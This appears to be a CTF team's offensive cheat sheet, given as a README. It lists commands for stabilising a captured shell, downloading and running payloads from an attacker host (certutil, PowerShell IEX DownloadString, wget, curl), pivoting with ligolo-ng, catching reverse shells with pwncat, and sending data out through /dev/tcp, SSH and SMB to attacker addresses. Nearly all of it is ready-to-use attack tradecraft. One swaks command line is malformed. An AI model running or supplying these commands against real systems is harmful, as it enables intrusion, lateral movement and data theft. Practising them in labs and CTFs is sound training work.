# 🄿🅄🅁🄿🄻🄴🅂🅃🄾🅁🄼 🅃🅃🄿🅂

A collection of commands, tools, techniques and procedures of the purplestorm ctf team.

## Table of Contents

- [Basics](#basics)
  - [Stabilizing Linux Shell](#stabilizing-linux-shell)
  - [Port Forwarding](#port-forwarding)
  - [Transfering Files](#transfering-files)
- [Tooling](#tooling)
  - [Swaks](#swaks)
  - [ligolo-ng](#ligolo-ng)
  - [CrackMapExec](CrackMapExec.md)
- [C2](#c2)
  - [Sliver](Sliver.md)
- [Databases](#databases)
  - [SQL Injection](SQL%20Injection.md)
- [Payloads](#payloads)
  - [Reverse Shell](#reverse-shell)
- [Data Exfiltration](#exfiltrating-data)


## Basics

### Stabilizing Linux Shell / Obtaining a comfy pty (pseudo terminal) 

1. spawn a pty (required for interactive IO such as `su`)

via `python2`:
```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

via `python3`:
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

via `script` (works most of the time when python is not available):
```shell
script /dev/null -c bash
```

2. hit __CTRL+Z__ to background your listener process

3. configure your shell to send IO straight through the connenction and not echo back input.  
```shell
stty raw -echo; fg
```
this allows for __CTRL+L__ and __CTRL+C__ to work.

4. paste for extra comfort :)
```shell
export SHELL=/bin/bash;
export TERM=xterm;
alias ll='ls --color -alhF';
stty rows 110 cols 240;
reset;
```


## Transfering files

### Windows

cmd:

```
iwr -uri "http://10.10.10.10:8080/shell.exe" -outfile "shell.exe"

wget -O shell.exe 10.10.10.10:8000/shell.exe

certutil -urlcache -f  http://10.10.10.10:8000/shell.exe C:\inetpub\shell.exe
```

Powershell:

```
Invoke-WebRequest http://10.10.10.10:8000/shell.exe -OutFile shell.exe

powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/shell.exe', 'shell.exe')"

powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/something.ps1')"
```

via SMB:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .    # On attacker

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe    # On target
```

### Linux

```
wget http://10.10.10.10:8000/some.sh

curl -o some.sh http://10.10.10.10:8000/some.sh
```

via base64:

```
cat shell.sh | base64 -w 0   # On attacker
echo <base64encoded> | base64 -d > shell.sh   # On target
```
via scp:
```
scp some.sh user@10.10.10.10:/tmp/some.sh   # On attacker
```

## Tooling

### Swaks

- [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)

```shell
swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
```

### Ligolo-ng

- [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

#### Prepare Tunnel Interface

```shell
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

#### Setup Proxy on Attacker Machine

```shell
./proxy -laddr LHOST:443 -selfcert
```

#### Setup Agent on Target Machine

```shell
./agent -connect LHOST:443 -ignore-cert
```

#### Configure Session

use the `session` command to select the agent session:
```ligolo-ng
ligolo-ng » session
```

display the network configuration of the agent session:
```ligolo-ng
[Agent : user@target] » ifconfig
```

add a route to the target internal network `172.16.1.0/24` via ligolo: (routes created this way are only temporary until the next reboot.)
```shell
sudo ip r add 172.16.1.0/24 dev ligolo
```
delete a route, in case you messed up:
```shell
sudo ip r del 172.16.1.0/24 dev ligolo
```

start tunneling to the target internal network:
```ligolo-ng
[Agent : user@target] » start
```

you can now reach the `172.16.1.0/24` internal network through the ligolo agent.  
everytime 

#### ligolo-ng Port Forwarding

```ligolo-ng
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

## Payloads

### Reverse Shell

- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)

```shell
pip install pwncat-cs
Listener: pwncat-cs 192.168.1.1 4444
(To change from pwncat shell to local shell, use Ctrl+D)
```

## Data Exfiltration

### Linux

#### via TCP socket, ebcdic and base64

On kali:

```
nc -nlvp 80 > datafolder.tmp
```

On target:

```
tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/10.10.10.10/80
```

On kali:

```
dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
tar xf datafolder.tar
```

#### via SSH

On target:

```
tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"
```

On kali:

```
cd /tmp/datafolder
```

### Windows

via SMB server:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username user -password pass share . -smb2support  # On kali
net use \\10.10.16.5\share /u:user pass   # On victim
copy C:\Users\user\Desktop\somefile.txt \\10.10.16.5\share\somefile.txt   # On victim
```

via pscp:

```
pscp Administrator@10.10.10.10:/Users/Administrator/Downloads/something.txt
```
